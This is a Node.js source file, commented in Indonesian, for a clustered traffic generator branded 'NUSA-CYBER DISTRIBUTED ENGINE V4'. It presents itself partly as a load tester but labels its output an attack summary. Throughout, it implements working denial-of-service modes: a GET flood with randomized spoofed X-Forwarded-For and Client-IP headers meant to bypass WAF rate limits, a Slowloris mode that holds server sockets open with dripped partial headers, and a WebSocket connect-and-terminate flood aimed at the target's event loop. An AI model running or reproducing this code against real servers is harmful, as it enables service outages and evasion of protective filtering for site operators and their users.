const cluster = require('cluster');
const http = require('http');
const https = require('https');
const net = require('net');
const tls = require('tls');
const os = require('os');
const WebSocket = require('ws');

// Konfigurasi Bawaan
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/113.0 Firefox/113.0',
    'Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1'
];

// Generator IP Acak untuk WAF Bypass Identity Rotation
const randomIP = () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;

const args = process.argv.slice(2);
const TARGET_URL = args[0] || 'http://localhost:5173/';
const TOTAL_VUS = parseInt(args[1]) || 500; // Load default
const MODE = args[2] || 'standard'; // 'standard', 'slowloris', 'soak', 'websocket'

const numCPUs = os.cpus().length;

let parsedUrl;
try {
    parsedUrl = new URL(TARGET_URL);
} catch (e) {
    console.error("URL Tidak Valid: " + TARGET_URL);
    process.exit(1);
}

const targetPort = parsedUrl.port || (parsedUrl.protocol === 'https:' || parsedUrl.protocol === 'wss:' ? 443 : 80);
const client = parsedUrl.protocol === 'https:' ? https : http;

// ─── MASTER PROCESS ──────────────────────────────────────────────────────────
if (cluster.isMaster) {
    console.log(`\n🌪️ NUSA-CYBER DISTRIBUTED ENGINE V4 INIT 🌪️`);
    console.log(`Target     : ${TARGET_URL}`);
    console.log(`Total VUs  : ${TOTAL_VUS} (Distributed ke ${numCPUs} CPU Cores)`);
    console.log(`Mode       : ${MODE.toUpperCase()}`);
    console.log(`Menyiapkan ${numCPUs} Worker Processes...\n`);

    const workers = [];
    const globalResults = {
        totalRequests: 0,
        successCount: 0,
        errorCount: 0,
        latencies: []
    };

    let start_time = Date.now();

    // Spawn Workers
    for (let i = 0; i < numCPUs; i++) {
        const worker = cluster.fork();
        workers.push(worker);

        worker.on('message', (msg) => {
            if (msg.type === 'RESULT') {
                globalResults.totalRequests += msg.data.totalRequests;
                globalResults.successCount += msg.data.successCount;
                globalResults.errorCount += msg.data.errorCount;
                if (msg.data.latencies) globalResults.latencies.push(...msg.data.latencies);
            }
        });
    }

    let workersDone = 0;
    cluster.on('exit', (worker, code, signal) => {
        workersDone++;
        if (workersDone === numCPUs) {
            const end_time = Date.now();
            const duration = (end_time - start_time) / 1000;
            const rps = (globalResults.totalRequests / duration).toFixed(2);
            
            const sortedLatencies = globalResults.latencies.sort((a,b) => a - b);
            const p95Index = Math.floor(sortedLatencies.length * 0.95);
            const p95 = sortedLatencies.length > 0 ? sortedLatencies[p95Index] : 0;
            const avg = sortedLatencies.length > 0 ? (sortedLatencies.reduce((a,b)=>a+b, 0) / sortedLatencies.length).toFixed(1) : 0;

            console.log(`\n════════════════════════════════════════`);
            console.log(`  🔥 DISTRIBUTED ATTACK SUMMARY 🔥`);
            console.log(`════════════════════════════════════════`);
            console.log(`  │ Serangan Mode   : ${MODE.toUpperCase()}`);
            console.log(`  │ Total Koneksi   : ${globalResults.totalRequests}`);
            console.log(`  │ Tembus/Sukses   : ${globalResults.successCount}`);
            console.log(`  │ Gagal/Ditolak   : ${globalResults.errorCount}`);
            console.log(`  │ Total Waktu     : ${duration.toFixed(2)} detik`);
            console.log(`  │ Kecepatan (RPS) : ${rps} Req/Sec\n`);
            console.log(`  │ Ping Rata-rata  : ${avg} ms`);
            console.log(`  │ Ping P95 Spike  : ${p95} ms`);
            console.log(`  └──────────────────────────────────┘\n`);

            // Output JSON for specific server readout 
            const exportReady = {
                failed: globalResults.errorCount > 0 || p95 > 2500,
                metrics: {
                    reqs: globalResults.totalRequests,
                    success: globalResults.successCount,
                    errRate: globalResults.totalRequests > 0 ? ((globalResults.errorCount / globalResults.totalRequests) * 100).toFixed(1) + '%' : '0%',
                    rps: rps,
                    p95Ms: p95
                },
                failures: []
            };

            process.stdout.write('JSON_START:' + JSON.stringify(exportReady) + ':JSON_END\n');
        }
    });

} 
// ─── CHILD WORKER PROCESS ───────────────────────────────────────────────────
else {
    const workerRequests = Math.floor(TOTAL_VUS / numCPUs);
    const localResults = { totalRequests: 0, successCount: 0, errorCount: 0, latencies: [] };

    const finishWorker = () => {
        process.send({ type: 'RESULT', data: localResults });
        process.exit(0);
    };

    // 1. STANDARD & SOAK WORKER (Fast Speed)
    const runFastWorker = async () => {
        const agent = new client.Agent({ keepAlive: true, maxSockets: 5000 });
        const promises = [];
        
        // Soak Mode: 10x perulangan internal
        const multiplier = MODE === 'soak' ? 10 : 1;
        const totalReq = workerRequests * multiplier;

        for (let i = 0; i < totalReq; i++) {
            const reqPromise = new Promise((resolve) => {
                const start = Date.now();
                const spoofedIP = randomIP();
                const randomUA = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
                
                const options = {
                    hostname: parsedUrl.hostname,
                    port: targetPort,
                    path: parsedUrl.pathname + parsedUrl.search,
                    method: 'GET',
                    agent: agent,
                    headers: { // WAF Bypassing Headers
                        'User-Agent': randomUA,
                        'X-Forwarded-For': spoofedIP,
                        'X-Real-IP': spoofedIP,
                        'Client-IP': spoofedIP,
                        'Forwarded': `for=${spoofedIP};proto=http`,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive'
                    }
                };

                const req = client.request(options, (res) => {
                    res.on('data', () => {}); 
                    res.on('end', () => {
                        localResults.totalRequests++;
                        if (res.statusCode >= 200 && res.statusCode < 400) {
                            localResults.successCount++;
                        } else {
                            localResults.errorCount++;
                        }
                        localResults.latencies.push(Date.now() - start);
                        resolve();
                    });
                });

                req.on('error', (err) => {
                    localResults.totalRequests++;
                    localResults.errorCount++;
                    resolve();
                });

                req.setTimeout(5000, () => req.destroy());
                req.end();
            });
            promises.push(reqPromise);
        }

        await Promise.allSettled(promises);
        finishWorker();
    };


    // 2. SLOWLORIS WORKER (Connection Exhaustion)
    const runSlowlorisWorker = async () => {
        const promises = [];
        const durationLimitMs = 15000; // Jalankan siksaan lambat 15 detik saja untuk pembuktian

        for (let i = 0; i < workerRequests; i++) {
            promises.push(new Promise((resolve) => {
                const connector = parsedUrl.protocol === 'https:' ? tls : net;
                
                try {
                    const socket = connector.connect({
                        host: parsedUrl.hostname,
                        port: targetPort,
                        rejectUnauthorized: false
                    }, () => {
                        localResults.totalRequests++; // Registered as hit
                        
                        // Send partial HTTP Headers!
                        socket.write(`GET ${parsedUrl.pathname} HTTP/1.1\r\n`);
                        socket.write(`Host: ${parsedUrl.hostname}\r\n`);
                        socket.write(`User-Agent: NusaCyber Slowloris Engine v4\r\n`);
                        socket.write(`Accept-language: id\r\n`);

                        // Drip 1 header dummy tiap 3 detik untuk mempertahankan posisi soket terbuka di Nginx target
                        const dripToken = setInterval(() => {
                            try {
                                socket.write(`X-Cyber-Trap-${Math.random()}: active\r\n`);
                            } catch(e) { clearInterval(dripToken); }
                        }, 3000);

                        // Potong koneksi jika waktu habis
                        setTimeout(() => {
                            clearInterval(dripToken);
                            try { socket.destroy(); } catch(e){}
                            localResults.successCount++; // Jika bertahan berarti slot memori target terpakai!
                            resolve();
                        }, durationLimitMs);
                    });

                    socket.on('error', (e) => {
                        localResults.errorCount++;
                        resolve();
                    });
                    
                    socket.on('close', () => { resolve(); });
                    
                } catch(e) { resolve(); }
            }));
        }

        await Promise.allSettled(promises);
        finishWorker();
    };

    // 3. WEBSOCKET FLAPPING WORKER (Race Condition Real-time Server)
    const runWebSocketWorker = async () => {
        const promises = [];
        const wsUrl = `ws${parsedUrl.protocol === 'https:' ? 's' : ''}://${parsedUrl.hostname}:${targetPort}${parsedUrl.pathname}`;

        // Create thousands of short-lived websocket connections sequentially or parallel
        for (let i = 0; i < workerRequests * 2; i++) {
            promises.push(new Promise((resolve) => {
                const start = Date.now();
                const ws = new WebSocket(wsUrl);
                
                ws.on('open', () => {
                    localResults.totalRequests++;
                    localResults.successCount++;
                    localResults.latencies.push(Date.now() - start);
                    // Langsung banting/tutup seketika untuk menghasilkan chaos di backend Event Loop Target
                    ws.terminate(); 
                    resolve();
                });

                ws.on('error', () => {
                    localResults.totalRequests++;
                    localResults.errorCount++;
                    resolve();
                });
                
                // Jika ws server timeout
                setTimeout(() => { ws.terminate(); resolve(); }, 3000);
            }));
            
            // Beri jeda sangat kecil agar event-loop kita tidak mati, namun buffer target jebol
            if (i % 50 === 0) await new Promise(r => setTimeout(r, 10));
        }

        await Promise.allSettled(promises);
        finishWorker();
    };


    // INIT WORKER ROUTING
    if (MODE === 'slowloris') {
        runSlowlorisWorker();
    } else if (MODE === 'websocket') {
        runWebSocketWorker();
    } else {
        runFastWorker();
    }
}
